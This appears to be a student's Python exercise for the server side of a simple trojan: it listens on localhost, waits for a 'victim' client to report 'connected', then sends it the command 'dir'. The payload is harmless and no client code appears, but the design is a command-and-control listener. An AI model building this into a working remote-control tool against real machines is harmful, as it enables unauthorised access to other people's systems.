#trojan dir horse

#Author: Augusto Takashi Fujimaki
#NUSP: 10333716

import selectors
import socket

HOST = 'localhost' # Symbolic name meaning all available interfaces
PORT = 50007 # Arbitrary non-privileged port

def accept(sock, mask):
    conn, addr = sock.accept() # Should be ready
    print('[Server] Connected by', addr)
    conn.setblocking(False)
    sel.register(conn, selectors.EVENT_READ, read)

def read(conn, mask):
    data = conn.recv(1024)
    data = data.decode(encoding = "ISO-8859-1")
    print('[Client]',data) # Hope it won't block

    if data=='connected':
        command = 'dir'
        command = command.encode()
        conn.send(command)
        print('[Server] Command sent: dir')
    else:        
        sel.unregister(conn)
        conn.close()


sel = selectors.DefaultSelector()
sock = socket.socket()
sock.bind((HOST, PORT))
print('[Server] Server Started')
print('[Server] Listening For Victim')
sock.listen(100)
sock.setblocking(False)
sel.register(sock, selectors.EVENT_READ, accept)

while True:
    events = sel.select()
    for key, mask in events:
        callback = key.data
        callback(key.fileobj, mask)